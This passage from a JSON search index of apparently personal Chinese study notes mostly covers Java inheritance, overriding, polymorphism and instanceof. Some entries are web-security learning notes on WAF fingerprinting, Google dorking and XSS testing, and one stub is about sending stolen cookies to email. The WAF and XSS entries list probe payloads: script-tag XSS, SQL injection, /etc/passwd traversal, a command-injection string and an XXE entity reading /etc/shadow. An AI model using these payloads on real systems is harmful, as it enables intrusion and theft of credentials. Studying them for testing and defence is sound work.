A06DaimaShunxu d = new A06DaimaShunxu();\n    }\n\n    //构造方法\n    public A06DaimaShunxu(){\n        System.out.println(\"无参构造方法A\");\n    }\n    {\n        System.out.println(\"实例代码块A\");\n    }\n    static{\n        System.out.println(\"静态代码块B\");\n    }\n}\n\n```\n---\n输出结果\n![[../../../../assets/Pasted image 20220703110707.png]]\n---\n由此可见\n1. 当类加载的时候，会最先执行静态代码块，自上而下\n2. 然后执行main主方法中的代码\n3. 如果遇到构造方法的时候，那么就会在构造方法的之前执行实例代码块的内容，然后再构造对象","lastmodified":"2023-05-31T09:03:32.957907017Z","tags":null},"/06-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%98%B2%E5%BE%A1%E4%B8%8E%E4%BF%AE%E5%A4%8D":{"title":"06-文件包含漏洞的防御与修复","content":"\n\n- 1、PHP配置\n  2、禁用动态包含\n  3、过滤协议、目录字符\n  4、设置文件白名单","lastmodified":"2023-05-31T09:03:32.957907017Z","tags":null},"/06-%E8%8E%B7%E5%8F%96cookie%E5%8F%91%E9%80%81%E5%88%B0%E9%82%AE%E4%BB%B6":{"title":"06-获取cookie发送到邮件","content":"\n\n- 已经有很多现成的工具了\n- 需要注意的是，邮箱的绑定一般需要临时密码验证，不是账户本来的密码，比如qq邮箱。\n- 参考案例：https://cloud.tencent.com/developer/article/1918319","lastmodified":"2023-05-31T09:03:32.957907017Z","tags":null},"/06-WAF%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB":{"title":"06-WAF指纹识别","content":"\n\n- web application firewall：web应用防火墙\n  作用：主要用来过滤http/https的请求\n- ## 作用\n- #question  作用\n\t- SQL Injection (SQLi)：阻止SQL注入\n\t- Cross Site Scripting (XSS)：阻止跨站脚本攻击\n\t- Local File Inclusion (LFI)：阻止利用本地文件包含漏洞进行攻击\n\t- Remote File Inclusione(RFI)：阻止利用远程文件包含漏洞进行攻击\n\t- Remote Code Execution (RCE)：阻止利用远程命令执行漏洞进行攻击\n\t- PHP Code Injectiod：阻止PHP代码注入\n\t- HTTP Protocol Violations：阻止违反HTTP协议的恶意访问\n\t- HTTPoxy：阻止利用远程代理感染漏洞进行攻击\n\t- Sshllshock：阻止利用Shellshock漏洞进行攻击\n\t- Session Fixation：阻止利用Session会话ID不变的漏洞进行攻击\n\t- Scanner Detection：阻止黑客扫描网站\n\t- Metadata/Error Leakages：阻止源代码/错误信息泄露\n\t- Project Honey Pot Blacklist：蜜罐项目黑名单\n\t- GeoIP Country Blocking：根据判断IP地址归属地来进行IP阻断\n## 分类\n硬件型 WAF（厂商安装）\n云 WAF（阿里云、腾讯云、华为云……）\n软件型 WAF（部署在 Apache、Nginx 等 HTTP Server 中）eg：ModSecurity\n## 厂商\n#question 常见WAF厂商\n\n各种云：阿里云、腾讯云、华为云、百度云……\n安全狗、宝塔、360、知道创宇、长亭、安恒……\n\u003c!--SR:!2023-03-17,1,190--\u003e\n## 识别思路\n#question 识别的思路\n- 额外的cookie；\n- 任何响应或请求的附加标头；\n- 响应内容（如果被阻止请求）；\n- 响应代码（如果被阻止请求）；\n- IP地址（云WAF）；\n- JS客户端模块（客户端WAF）\n  \u003c!--SR:!2023-03-17,1,208--\u003e\n  \n  \n  如何触发拦截？\n  ```javascript\n  xsstring = '\u003cscript\u003ealert(\"XSS\");\u003c/script\u003e' sqlistring = \"UNION SELECT ALL FROM information_schema AND ' or SLEEP(5) or '\"\n  lfistring = '../../../../etc/passwd' rcestring = '/bin/cat /etc/passwd; ping 127.0.0.1; curl google.com' xxestring = '\u003c!ENTITY xxe SYSTEM \"file:///etc/shadow\"\u003e]\u003e\u003cpwn\u003e\u0026hack;\u003c/pwn\u003e\n  ```\n  \n  指纹库：https://github.com/CSecGroup/wafid/blob/master/finger.xml\n## [[软件工具]]\nKali自带：\nhttps://github.com/EnableSecurity/wafw00f\n用法：wafw00f https://www.12306.cn\nnmap www.12306.cn --script=http-waf-detect.nse\nsqlmap -u \"xxx.com?id=1\" --identify-waf\n其他：\nhttps://github.com/0xInfection/Awesome-WAF","lastmodified":"2023-05-31T09:03:32.957907017Z","tags":null},"/061_%E7%BB%A7%E6%89%BF%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5":{"title":"061_继承基本概念","content":"# 061_继承基本概念\n\n## 重要\n**除了构造方法，其余的子类都继承，包括实例方法和get set方法都可以继承**\n在进行重新构造构造器的时候，可以通过super关键字快速完成，this.xx=xxx;的语句，比如\n```java\nclass A extends B{\npublic A(String name,int age){\n\tsuper(name,age);\n}\n}\n```\n需要注意的是，**super语句只能放在构造器内部的第一行**\n\n\u003e[!举例]\n\u003e爹很有钱，儿子以后也会有钱，爹的钱没用完\n\n## 作用\n1. 子类继承父类，**代码复用**\n2. 主要作用：有了继承关系，才有后续的方法覆盖和多态\n\n## 语法格式\n```java\n//A为父类，B为子类，B类继承A类\n//除了构造方法之外，无论是实例方法（get，set）还是变量都继承\nclass A{\n}\nclass B extends A{\n}\n```\n\n## 相关特性\n1. B类继承A类，则A类为超类，父类，B为子类，派生类\n2. **java中只支持单继承**，不支持多继承，C++支持多继承\n3. **缺点是耦合度高**，父类修改，那么子类也会受到牵连\n4. java中**除了构造方法之外都能继承，私有的属性（private）无法在子类中直接访问**（父类private修饰的不能在子类中直接访问）\n5. 没有指定父类的class，都默认继承的`Object`,`Object`是所有类的根类。\n\n## eg\n```java\npackage a006继承;\n\npublic class Jicheng {\n    public static void main(String[] args) {\n        Account a1 = new Account(\"zhangsan123\",100);//创建普通账户\n        System.out.println(a1.getAct()+\" 的余额是 \"+a1.getBalance());\n        CreditAccount c1 = new CreditAccount(\"lisi321\",120,100);\n        System.out.println(c1.getAct()+\" 的余额是 \"+c1.getBalance()+\"信誉度： \"+c1.getCredit());\n    }\n}\n\n// 银行卡\nclass Account{\n    private String act;\n    private double balance;\n    // get and set \n    public String getAct() {\n        return act;\n    }\n    public void setAct(String act) {\n        this.act = act;\n    }\n    public double getBalance() {\n        return balance;\n    }\n    public void setBalance(double balance) {\n        this.balance = balance;\n    }\n    // 构造方法\n    public Account(){\n        this(\"\",0);\n    }\n    public Account(String act, double balance) {\n        this.act = act;\n        this.balance = balance;\n    }\n    \n\n}\n\nclass CreditAccount extends Account{\n        private double credit;\n        //get and set\n        public double getCredit() {\n            return credit;\n        }\n\n        public void setCredit(double credit) {\n            this.credit = credit;\n        }\n        //构造方法\n        public CreditAccount(double credit) {\n            this.credit = credit;\n        }\n            //构造方法\n        public CreditAccount(String act, double balance, double credit) {\n            super(act, balance);\n            this.credit = credit;\n        }\n}\n```\n![](../../../../assets/Pasted%20image%2020220705215622.png)\n`super`是用来做引用父类的构造方法的。","lastmodified":"2023-05-31T09:03:32.957907017Z","tags":null},"/062_super%E5%85%B3%E9%94%AE%E5%AD%97":{"title":"062_super关键字","content":"# 062_super关键字\n\n在继承关系中，由于在子类的构造方法中，第一条语句默认为调用父类的无参构造方法（即默认为 super();，一般这行代码省略了）。\n\n简单的来说，要想使用父类的那个构造方法，就super它的形参按顺序放进来\t\n\n```java\npublic class Person {\n    public Person(String name, int age) {\n\n    }\n\n    public Person(String name, int age, String sex) {\n\n    }\n}\n```\nz\n```java\n\npublic class Student extends Person {\n    public Student(String name, int age, String birth) {\n        super(name, age); // 调用父类中含有2个参数的构造方法\n    }\n\n    public Student(String name, int age, String sex, String birth) {\n        super(name, age, sex); // 调用父类中含有3个参数的构造方法\n    }\n}\n```\n","lastmodified":"2023-05-31T09:03:32.957907017Z","tags":null},"/063_%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E7%BB%A7%E6%89%BF":{"title":"063_什么时候可以使用继承","content":"# 063_什么时候可以使用继承\n\n凡是可以用“is a”来描述的，都可以考虑采用继承\n## eg\n1. 猪是一个动物\n2. 信用卡是一个银行账户\n\n\u003e[!注意]\n\u003e即使两个类中有相同的代码，也不一定要采用继承\n\u003e比如客户和产品中都有名字，不适合继承的，一是因为不符合常理，难以理解两者的关系，二是因为如果后续在父类中添加字段等等，那么子类也会受到奇怪的牵连","lastmodified":"2023-05-31T09:03:32.957907017Z","tags":null},"/07-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF":{"title":"07-搜索引擎收集信息","content":"\npublic:: true\n\n## Google Hacking\n### 运算符\n1. 完整匹配：\"\"\n2. 剔除不需要的内容： -\n### 高级语法\n![](https://tc3.doingnothing.online/assets/Pasted%20image%2020230314163012.png)\n\n语法仓库\nhttps://www.exploit-db.com/google-hacking-database\nhttps://github.com/BullsEye0/google_dork_list\n\n[[软件工具]]\nhttps://github.com/m3n0sd0n4ld/uDork\n- ### index of\n  可以根据网页中是否有这段文字，来找是否有泄露目录的网站\n  ![](https://tc3.doingnothing.online/assets/Pasted%20image%2020230314163205.png){:height 268, :width 744}","lastmodified":"2023-05-31T09:03:32.957907017Z","tags":null},"/07-xss%E7%9A%84%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%88%A9%E7%94%A8":{"title":"07-xss的检测与利用","content":"\n\n# 测试payload\n\n```\n\u003cscript\u003ealert('XSS')\u003c/script\u003e\n\u003cscript\u003ealert(document.cookie)\u003c/script\u003e\n\u003e\u003cscript\u003ealert(document.cookie)\u003c/script\u003e\n='\u003e\u003cscript\u003ealert(document.cookie)\u003c/script\u003e\n\"\u003e\u003cscript\u003ealert(document.cookie)\u003c/script\u003e\n%3Cscript%3Ealert('XSS')%3C/script%3E\n\u003cimg src=\"javascript:alert('XSS')\"\u003e\nonerror=\"alert('XSS')\"\u003e\n```\n# XSSER检测工具\n- https://xsser.03c8.net/\n# XSSSTRIKE攻击工具\n\nhttps://github.com/s0md3v/XSStrike python 3.6 以上","lastmodified":"2023-05-31T09:03:32.957907017Z","tags":null},"/0711_%E6%96%B9%E6%B3%95%E8%A6%86%E7%9B%96override":{"title":"0711_方法覆盖override","content":"# 0711_方法覆盖override\n\n## 什么时候使用\n子类继承父类之后，当继承的方法无法满足当前子类的业务需求，子类有权利对这个方法进行重新编写，进行方法覆盖。`override`\n## 语法格式\n\n## 编写的结论\n1. 两个类**必须要有继承关系**\n2. 重写之后的方法必须满足的条件**（除了**修饰符列表可以不同**，其他必须完全一样）**\n\t1. **相同的返回值类型**\n\t2. **相同的方法名称**\n\t3. **相同的形式参数列表**\n3. 子类的**访问权限不能更低，可以更高**，比如父类是`public`,那么子类就不能是`protected`**受保护的**，但是相反则可以\n4. **覆盖之后的方法不能比之前的方法抛出更多的异常，可以更少或者没有。**\n\n## 注意事项\n1. 方法覆盖只针对**方法**，和属性（实例对象的属性，就是你定义的那几个字段）无关\n2. **私有方法（private）无法覆盖**\n3. 构造方法不能继承，所以构造方法不能被覆盖\n4. **方法覆盖只能针对实例方法**，静态方法无法覆盖\n\n---\n相关：[017.方法重载overload](../../01铺垫/017.方法重载overload.md)","lastmodified":"2023-05-31T09:03:32.957907017Z","tags":null},"/0712_%E8%A6%86%E7%9B%96eg":{"title":"0712_覆盖eg","content":"# 0712_覆盖eg\n\n## 举例\n```java\npackage a007方法覆盖和多态;\n\npublic class Dongwu1 {\n    public static void main(String[] args) {\n        System.out.println(\"动物：\");\n        Animal a1 = new Animal();\n        a1.move();\n\n        System.out.println(\"猴子：\");\n        Monkey m1=new Monkey();\n        m1.move();\n\n        System.out.println(\"鸟儿：\");\n        Bird b1=new Bird();\n        b1.move();\n    }\n}\n\nclass Animal{\n    public void move(){\n        System.out.println(\"动物在移动！\");\n    }\n}\n\n// 猴子类继承animal\nclass Monkey extends Animal{\n    //动物和猴子的移动方式可能不一样，所以需要方法覆盖重写移动方式为爬树\n    public void move(){\n        System.out.println(\"猴子在爬树\");\n    }\n}\n\n// 鸟类继承Monkey\nclass Bird extends Monkey{\n    // 鸟不爬树，飞重写移动方式\n    public void move(){\n        System.out.println(\"鸟儿在飞\");\n    }\n}\n```\noutput\n![](../../../../assets/Pasted%20image%2020220706160404.png)","lastmodified":"2023-05-31T09:03:32.957907017Z","tags":null},"/0713_%E6%96%B9%E6%B3%95%E8%A6%86%E7%9B%96%E7%BB%8F%E5%85%B8%E4%BE%8B%E5%AD%90":{"title":"0713_方法覆盖经典例子","content":"# 0713_方法覆盖经典例子\n\n\n```java\npackage a007方法覆盖和多态;\n\npublic class Speak {\n    public static void main(String[] args) {\n        People p1=new People(\"人\");\n        p1.speak();\n\n        ChinesePeople c1=new ChinesePeople(\"蔡徐坤\");\n        c1.speak();\n\n        American a1=new American(\"Davoe\");\n        a1.speak();\n    }\n}\n// 人类\nclass People{\n    private String name;\n\n    //get and set\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n    \n    // 构造方法\n    public People(){}\n    public People(String name) {\n        this.name = name;\n    }\n\n    // 说话\n    public void speak(){\n        System.out.println(name+\"在说话\");\n    }\n\n}\n// 中国人\nclass ChinesePeople extends People{\n    // 构造方法\n    public ChinesePeople(){\n\n    }\n    public ChinesePeople(String name){\n        this.setName(name);\n    }\n\n\n    public void speak(){\n        System.out.println(this.getName()+\"在说汉语.\");\n    }\n}\n// 美国人\nclass American extends People{\n    public American(){\n\n    }\n    public American(String name){\n        super(name);\n    }\n    public void speak(){\n        System.out.println(this.getName()+\"are speaking English.\");\n    }\n}\n```\noutput\n![](../../../../assets/Pasted%20image%2020220706164253.png)\n\n## 说明\n在这个例子中，通过中国人和美国人去继承父类人类，然后由于说的语种不同，通过方法覆盖实现了不同人种说不同的语言\n值得一说的是，可以将super()实现的构造方法，通过\n`    public ChinesePeople(String name){\n        this.setName(name);\n    }`也可以完成对象的有参构造","lastmodified":"2023-05-31T09:03:32.957907017Z","tags":null},"/0714_%E4%BE%8B%E5%AD%90toString%E6%96%B9%E6%B3%95%E8%A6%86%E7%9B%96":{"title":"0714_例子toString方法覆盖","content":"# 0714_例子toString方法覆盖\n\n\n## 要求\n定义一个日期类\n输出日期对象的时候，直接输出日期对象的值\n\n```package a007方法覆盖和多态;\n\n  \n\npublic class ToString1 {\n\n    public static void main(String[] args) {\n\n        Date d1=new Date(2019, 12, 2);\n\n        System.out.println(d1);\n\n    }\n\n}\n\nclass Date{\n\n    private int year;\n\n    private int month;\n\n    private int day;\n\n    // 对tostring进行方法覆盖\n\n    public int getYear() {\n\n        return year;\n\n    }\n\n    public void setYear(int year) {\n\n        this.year = year;\n\n    }\n\n    public int getMonth() {\n\n        return month;\n\n    }\n\n    public void setMonth(int month) {\n\n        this.month = month;\n\n    }\n\n    public int getDay() {\n\n        return day;\n\n    }\n\n    public void setDay(int day) {\n\n        this.day = day;\n\n    }\n\n    public Date(int year, int month, int day) {\n\n        this.year = year;\n\n        this.month = month;\n\n        this.day = day;\n\n    }\n\n  \n\n}\n```\n## 提示\n`println`默认是将对象`toString`之后进行输出，但是`toString`是将对象位置@在内存中的地址hash之后的值进行输出，如下\n```java\n        Date d1=new Date(2019, 12, 2);\n        System.out.println(d1);\n```\n![](../../../../assets/Pasted%20image%2020220706171545.png)\n\n那么可以根据date的实际需求，方法覆盖toString方法，直接返回其日期，这样打印的日期对象，就直接是日期了\n\n添加方法覆盖\n```java\n    public String toString(){\n\n        return year+\"年\"+month+\"月\"+day+\"日\";\n\n    }\n```\n添加后 ^tostringfffg\n```java\npackage a007方法覆盖和多态;\n\npublic class ToString1 {\n    public static void main(String[] args) {\n        Date d1=new Date(2019, 12, 2);\n        System.out.println(d1);\n    }\n}\nclass Date{\n    private int year;\n    private int month;\n    private int day;\n    // 对tostring进行方法覆盖\n    public int getYear() {\n        return year;\n    }\n    public void setYear(int year) {\n        this.year = year;\n    }\n    public int getMonth() {\n        return month;\n    }\n    public void setMonth(int month) {\n        this.month = month;\n    }\n    public int getDay() {\n        return day;\n    }\n    public void setDay(int day) {\n        this.day = day;\n    }\n    public Date(int year, int month, int day) {\n        this.year = year;\n        this.month = month;\n        this.day = day;\n    }\n    public String toString(){\n        return year+\"年\"+month+\"月\"+day+\"日\";\n    }\n\n}\n```\noutput \n![](../../../../assets/Pasted%20image%2020220706172335.png) ^4a2490","lastmodified":"2023-05-31T09:03:32.957907017Z","tags":null},"/0721_%E5%A4%9A%E6%80%81":{"title":"0721_多态","content":"# 0721_多态\n\n## 基本概念\n多动态，就是多种形态，多种状态。\n\u003e简单的来说，就是java程序在 **[编译阶段 和执行阶段 所真正参与的是不同的对象](076.多态举例.md#java程序执行过程)**，所以叫多态。\n\u003e父类型引用执行子类型对象，包括编译阶段和执行阶段\n\u003e编译阶段 ：静态绑定父类的方法（方法区） ^jtbd\n\u003e执行阶段：动态绑定子类的方法（堆内存）\n\n","lastmodified":"2023-05-31T09:03:32.957907017Z","tags":null},"/0722_%E5%A4%9A%E6%80%81%E4%B8%BE%E4%BE%8B":{"title":"0722_多态举例","content":"# 0722_多态举例\n\n## eg\n定义Animal、Cat、Dog类用来定义对象\n动物\n```java\npackage a007方法覆盖和多态;\n\npublic class Animal {\n    public void move(){\n        System.out.println(\"动物在移动。\");\n    }\n}\n```\n猫\n```java\npackage a007方法覆盖和多态;\n\npublic class Cat extends Animal{\n    public void move(){\n        System.out.println(\"猫在爬树。\");\n    }\n}\n```\n狗\n```java\npackage a007方法覆盖和多态;\n\npublic class Dog extends Animal {\n    public void move(){\n        System.out.println(\"你在狗叫什么？\");\n    }\n}\n\n```\n\n\n主方法通过不同的对象创建方式，输出不同对象 所产生的行为方式\n```java\npackage a007方法覆盖和多态;\n\npublic class Duotai01 {\n    public static void main(String[] args) {\n        // new object\n        Animal a1 = new Animal();\n        a1.move();\n        Cat c1 = new Cat();\n        c1.move();\n        Dog d1 = new Dog();\n        d1.move();\n        \n        System.out.println(\"=====分割线=====\");\n        // 多态\n        Animal a2 = new Animal();//动物园，向上转型\n        a2.move();\n        Animal c2=new Cat();//猫是一种动物\n        c2.move();\n        Animal d2=new Dog();//狗屎一种动物\n        d2.move();\n    }\n}\n\n```\noutput\n![](../../../../assets/Pasted%20image%2020220707154739.png)\n\n---\n由上图可知，通过多态，可以将动物中不同的具体动物所产生的行为进行输出，\n在创建实例对象的时候，可以通过向上转型将对象中的子类与父类产生关系\n比如 动物和猫都是一个类，但是猫也是动物的一部分，所以猫是一种动物，可以\n`动物 汤姆=new 动物;`来将猫new在动物中\n\n## java程序执行过程\neg\n```java\nAnimal c2=new Cat();//猫是一种动物\n        c2.move();\n```\n编译阶段：\n\t编译器知道c2的类型是Animal，编译器检查语法，Animal.class字节码文件中寻找move()方法，找到之后，绑定move()方法，编译通过，静态绑定就成功，此时在方法区中。（编译阶段称为静态绑定）\n运行阶段\n\t运行的时候，在堆内存的c2对象实际是Cat对象，在move()的时候实际是Cat在参与，所以运行阶段就会动态的去执行Cat中的move()方法\n\t![](../../../../assets/Pasted%20image%2020220707161219.png)","lastmodified":"2023-05-31T09:03:32.957907017Z","tags":null},"/0723_%E5%90%91%E4%B8%8B%E8%BD%AC%E5%9E%8B":{"title":"0723_向下转型","content":"# 0723_向下转型\n\n## 向上转型和向下转型\n![](上下转型.png)\n1. java中允许[向上转型](076.多态举例.md)，也允许向下转型（不要说自动类型转换和强制类型转换，那是基本变量类型转换，上图只是为了能够更好地理解）\n2. 不论是向上转型还是向下转型，都**必须有继承关系**（没有继承关系，那么不能转型）\n\n向上转型： `Anlimal a=new Cat()`\n向下转型：`Cat b=(Cat)a`\n\n## 什么时候使用向下转型\n\u003e 不要随便做强制转换\n\u003e 1. 当你访问的是一个**父类中没有，子类对象中所“特有”的方法**，此时必须**向下转型**\n\u003e 2. 当然，你也可以在父类中补充这个方法，那样就是方法覆盖了，就不用向下转型了\n\u003e 3. 原因是 **虽然aa3运行是猫对象，但是由于底层是狗对象，而且Cat和Dog两个之间没有相互继承关系，所以无法向下转型，抛出异常**，可以通过if判断和`instanceof`判断来避免这种错误\neg\n在`Cat`类中增加**猫抓老鼠**的方法\n```java\n    public void catchMouse(){\n        System.out.println(\"猫抓老鼠\");\n    }\n```\n主方法中new猫，让猫抓老鼠\n```java\n        Animal c3=new Cat();\n\n        c3.catchMouse();\n```\noutput\n![](../../../../assets/Pasted%20image%2020220707163142.png)\n可以发现失败了，因为虽然子类cat有猫抓老鼠的方法，但是，在代码编译阶段，父类中没有书写抓老鼠的catchMouse方法，那么就会[[075.多态#^0e7d11|静态绑定]]失败。\n这个时候就需要**强制转换**\n**子类特有的方法才需要强制转换**，也可以通过在父类添加对应的同名方法避免报错\n```java\n        Animal c3=new Cat();\n\n  \n\n        Cat cc3=(Cat)c3;//强制转换\n\n        cc3.catchMouse();\n```\n动物和猫之间存在继承关系，可以进行强制转换\n将动物`c3`强制转换成**猫**，然后赋给`cc3`，这样就可以了\n\n## 向下转型的风险\n\u003e 可能出现`java.lang.ClassCastException` 类型转换异常\n\neg\n```java\nAnimal a3=new Dog();//动物对象 a3，底层为对象狗\n        Cat aa3=(Cat)a3;    // 将a3强制转换成Cat对象，赋值给aa3\n        aa3.catchMouse();   //虽然aa3运行是猫对象，但是由于底层是狗对象，而且Cat和Dog两个之间没有相互继承关系，所以无法向下转型，抛出异常\n```\noutput\n![[../../../../assets/Pasted image 20220707170451.png]]\n原因是因为底层对象Dog a3和被定义的Cat aa3之间的类不存在继承关系，所以编译不会报错，但是运行之后发现两者的继承存在问题，无法强制向下转型\n\n## 怎么避免java.lang.ClassCastException\n可以通过使用if语句判断[[078.instanceof运算符|instanceof运算符]]是否是指定的对象，来决定是否执行方法\n```java\n        if(a3 instanceof Cat){\n            Cat aa3=(Cat)a3;    // 将a3强制转换成Cat对象，赋值给aa3\n            aa3.catchMouse();   //虽然aa3运行是猫对象，但是由于底层是狗对象，而且Cat和Dog两个之间没有相互继承关系，所以无法向下转型，抛出异常\n\n        }\n```\noutput 没有提示 类型转换错误\n![[../../../../assets/Pasted image 20220707185422.png]]","lastmodified":"2023-05-31T09:03:32.957907017Z","tags":null},"/0724_instanceof%E8%BF%90%E7%AE%97%E7%AC%A6":{"title":"0724_instanceof运算符","content":"# 0724_instanceof运算符\n\n\u003e[!作用]\n\u003e用于判断 某**对象实例 是否动态指向 一个类 ，或者由一个类直接或间接创建**的\n\n## 重要结论\n\n1. 左边是实例对象，右边是类\n2. 只要左边的实际对象 是右边类的 继承树 以下的类或刚好一样的类，就是true\n\n## 判断\n\u003e判断方法：\n\u003e可以通过判断是否与实例对象的底层对象在 **同一底层类** 上进行判断\n实例对象 “**蔡徐坤**” 是否是某个类 直接或者间接创建的，比如 `person cxk=new chinse`，“人类”下有“中国人”和“美国人”两个子类，，那么 `蔡徐坤 instanceof 中国人`或者`蔡徐坤 instanceof 人`就为`true`，而`蔡徐坤 instanceof 美国人`就为`false`\n![[../assets/4de59670f9094a57b5c56db916d09483.png]]\n如上，蔡徐坤实例，底层是中国人，同时中国人继承自人类，所以无论是instanceof中国还是人类，都是**true**，而美国人与这两个虽然与人类具备了继承关系，但是与底层中国人不具备直接继承关系，所以为false\n\n## eg\n类文件\n动物\n```java\npackage a007方法覆盖和多态;\n\npublic class Animal {\n\n}\n\n```\n\n猫和猪\n```java\npackage a007方法覆盖和多态;\n\npublic class Cat extends Animal{\n}\n\nclass Pig extends Cat{\n    \n}\n```\n\n狗\n```java\npackage a007方法覆盖和多态;\n\npublic class Dog extends Animal {\n\n}\n\n```\n\n主方法\n```java\npackage a007方法覆盖和多态;\n\npublic class Duotai01 {\n    public static void main(String[] args) {\n        // new object\n\n        Animal a3=new Dog();//动物对象 a3，底层为对象狗\n        System.out.println(a3 instanceof Animal);\n        Animal a4=new Pig();\n        System.out.println(a4 instanceof Animal);\n\n        \n    }\n}\n\n```\n那么类和实例的关系就是\n![[../assets/6cbdf086d39941a7a7c64a4ecc04c414.png]]\n可以看到a3底层是狗，a4底层是猪，但是在父类或者父类的父类继承树上都是 animal，所以输出为ture\n![[../../../../assets/Pasted image 20220707185248.png]]\n\n","lastmodified":"2023-05-31T09:03:32.957907017Z","tags":null},"/0725_%E5%A4%9A%E6%80%81%E4%BE%8B%E5%AD%90a%E4%B8%BB%E4%BA%BA%E5%96%82%E5%AE%A0%E7%89%A9":{"title":"0725_多态例子a主人喂宠物","content":"# 0725_多态例子a主人喂宠物\n\n代码\n```java\npackage a007方法覆盖和多态.多态例子动物喂养;\n\n\npublic class Test {\n    public static void main(String[] args) {\n        System.out.println(\"主人喂养宠物实例：\");\n    \n        Master cxk=new Master();//创建主人\n\n        Pet p1=new Pet();//创建宠物\n        System.out.println(\"\\n开始喂宠物：\");\n        cxk.feed(p1);\n\n        Dog d1=new Dog();//创建狗对象\n        System.out.println(\"\\n开始喂狗：\");\n        cxk.feed(d1);\n\n        Cat c1 = new Cat();//创建猫对象\n        System.out.println(\"\\n开始喂猫：\");\n        cxk.feed(c1);\n        \n\n    }\n}\n\n\n// Master class\nclass Master{\n    // 喂养宠物\n    public void feed(Pet pet){\n        pet.eat();\n    }\n}\n\n// class Pet\nclass Pet{\n    // 宠物吃东西\n    public void eat(){\n        System.out.println(\"宠物吃东西\");\n    }\n}\n\n// Dog class\nclass Dog extends Pet{\n    // 狗儿啃骨头\n    public void eat(){\n        System.out.println(\"狗儿啃骨头\");\n    }\n}\n\n// Cat class\nclass Cat extends Pet{\n    public void eat(){\n        System.out.println(\"猫儿吃鱼\");\n    }\n}\n```\noutput \n![[../../../../assets/Pasted image 20220708163700.png]]\n解释\n![[../assets/8502b1b771a64162b6251fe54eb3ae2c.png]]\n1. 主人cxk需要喂养宠物，宠物有猫和狗，所以宠物可以作为子类继承父类宠物\n2. 主人有`feed`喂养方法，但是由于喂养的宠物对象不同，宠物吃的也不同，所以可以采用 feed Pet类去，然后通过Pet与各个具体宠物的继承关系，去考虑宠物的具体吃的方法\n3. 由于吃是一个方法，在继承中，由于继承会继承吃，所以在父类`Pet`中的`eat`方法，在子类`Cat`和`Dog`中可能不太适用，所以可以通过方法覆盖 **override**的方式将eat在各个具体的宠物类中书写eat方法\n执行\n1. 在执行的时候，d1是一个继承于 Pet的 狗\n2. 在cxk 喂养的时候，执行feed方法，feed方法中有eat方法表示动物吃饭\n3. 就会在Pet中寻找类型为Dog的类，在类中发现了**方法覆盖的eat方法**，就执行这个覆盖的eat()方法——狗啃骨头\n\n相关优化\n[[080.宠物养猫优化]]","lastmodified":"2023-05-31T09:03:32.961907053Z","tags":null},"/0726_%E5%AE%A0%E7%89%A9%E5%85%BB%E7%8C%AB%E4%BC%98%E5%8C%96":{"title":"0726_宠物养猫优化","content":"# 0726_宠物养猫优化\n\n## 相关\n1. 类继承：猫狗与宠物之间的继承关系\n2. 向下继承：向下继承，如果需要调用子类独有的方法（pig的睡觉方法，在pet中没有），需要强制转换类型，前提是两个类继承关系，且[[077.向下转型|向下转型]]才必须强制转型\n3. 独有实例方法的调用\n4. 向上继承的创建对象：Pet p2=new Pig();\n5. 多态：宠物的多个具体事物，有不同的吃的方法，主人通过调用喂养方法，去访问宠物的吃\n6. 方法覆盖override：由于子类有不同的eat方法，在实际调用的时候，会访问其具体对象的eat方法\n## 代码\n\n```java\npackage a007方法覆盖和多态.多态例子动物喂养;\n\n\npublic class Test {\n    public static void main(String[] args) {\n        System.out.println(\"主人喂养宠物实例：\");\n    \n        Master cxk=new Master(\"蔡徐坤\");//创建主人\n        System.out.println(cxk.getName());\n        Pet p1=new Pet();//创建宠物\n        System.out.println(\"\\n\"+cxk.getName()+\"开始喂宠物：\");\n        cxk.feed(p1);\n\n        Dog d1=new Dog(\"旺财\");//创建狗对象\n        System.out.println(\"\\n\"+cxk.getName()+\"开始喂狗：\"+d1.getName());\n        cxk.feed(d1);\n\n        Cat c1 = new Cat(\"汤姆\");//创建猫对象\n        System.out.println(\"\\n\"+cxk.getName()+\"开始喂猫：\"+c1.getName());\n        cxk.feed(c1);\n\n        System.out.println(\"Pig对象\");\n        Pet p2 = new Pig(\"佩奇\");\n        System.out.print(p2.getName());\n        Pig p3=(Pig)p2;\n        p3.sleep();\n\n        Pig p4=new Pig(\"乔治\");\n        System.out.print(p4.getName());\n        p4.sleep();\n                \n\n    }\n}\n\n\n// Master class\nclass Master{\n    private String name;\n    //get and set\n    public String getName() {\n        return name;\n    }\n    public void setName(String name) {\n        this.name = name;\n    }\n    //constructor\n    public Master(){}\n    public Master(String name) {\n        this.name = name;\n    }\n\n\n    // 喂养宠物\n    public void feed(Pet pet){\n        pet.eat();\n    }\n}\n\n// class Pet\nclass Pet{\n    private String name;\n    \n    // constructor\n    public Pet(){}\n    public Pet(String name) {\n        this.name = name;\n    }\n\n\n    public String getName() {\n        return name;\n    }\n\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n\n    // 宠物吃东西\n    public void eat(){\n        System.out.println(\"宠物吃东西\");\n    }\n}\n\n// Dog class\nclass Dog extends Pet{\n    //re constructor\n\n    public Dog(String name) {\n        super(name);\n    }\n\n    public Dog() {\n    }\n\n    // 狗儿啃骨头\n    public void eat(){\n        System.out.println(\"狗儿啃骨头\");\n    }\n}\n\n// Cat class\nclass Cat extends Pet{\n    \n    public Cat() {\n    }\n\n    public Cat(String name) {\n        super(name);\n    }\n\n    public void eat(){\n        System.out.println(\"猫儿吃鱼\");\n    }\n}\n\nclass Pig extends Pet{\n    public Pig(){\n    }\n    public Pig(String name){\n        super(name);\n    }\n    // 猪的独有方法\n    public void sleep(){\n        System.out.println(\"猪在睡觉\");\n    